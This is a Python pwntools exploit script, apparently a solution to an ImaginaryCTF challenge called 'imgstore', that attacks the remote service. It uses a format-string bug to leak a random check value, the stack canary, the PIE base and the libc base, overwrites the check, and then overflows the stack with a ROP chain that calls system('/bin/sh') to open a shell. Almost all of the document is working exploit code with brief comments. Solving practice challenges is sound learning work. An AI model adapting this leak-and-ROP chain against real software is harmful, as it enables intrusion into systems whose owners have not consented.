from pwn import *

name = './imgstore'
elf = context.binary = ELF(name)
#p = process(name)
libc = elf.libc
#gdb.attach(p)
p = remote('imgstore.chal.imaginaryctf.org', 1337)

#printf vulnerability at choice 3
# we can use it to leak the random bytes so we can bypass the 0xbeeffeed check
#  Doing so gives us a buffer overflow to assumably rop, need to beat canary

#Leaking random bytes
p.sendlineafter(b'>>', b'3')
p.sendlineafter(b'Enter book title:', b'%7$p')
p.recvuntil(b'--> ')
random_bytes = int(p.recvline()[:-1], 16) & 0xffffffff
log.info(hex(random_bytes))

#Leaking Canary
p.sendlineafter(b'[y/n]:', b'y')
p.sendlineafter(b'Enter book title:', b'%17$p')
p.recvuntil(b'--> ')
canary = int(p.recvline()[:-1], 16)
log.info(hex(canary))

#Leaking Pie Base
p.sendlineafter(b'[y/n]:', b'y')
p.sendlineafter(b'Enter book title:', b'%6$p')
p.recvuntil(b'--> ')
elf.address = int(p.recvline()[:-1], 16) - 0x7900000000006060
log.info(hex(elf.address))

#Leaking Libc Base
p.sendlineafter(b'[y/n]:', b'y')
p.sendlineafter(b'Enter book title:', b'%13$p')
p.recvuntil(b'--> ')
libc.address = int(p.recvline()[:-1], 16) - 0x8459a
log.info(hex(libc.address))

#Now we will overwrite the check value to bypass
check_value = elf.address + 0x6050
overwrite_value = random_bytes * 0x13f5c223
log.info(hex(check_value))
log.info(hex(overwrite_value & 0xFFFFFFFF))

#Overwriting that check
payload = fmtstr_payload(8, {check_value: (overwrite_value & 0xFFFFFFFF)}, write_size='short')
p.sendlineafter(b'[y/n]:', b'y')
p.sendlineafter(b'Enter book title:', payload)

#Free overflow to shell
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])
rop_libc.call((rop_libc.find_gadget(["pop rdi", "ret"]))[0])
rop_libc.call(next(libc.search(b'/bin/sh\x00')))
rop_libc.call(libc.sym['system'])

payload = 104*b'\x00' 
payload += p64(canary) 
payload += p64(0)
payload += rop_libc.chain()
p.sendlineafter(b'>', payload)

p.interactive()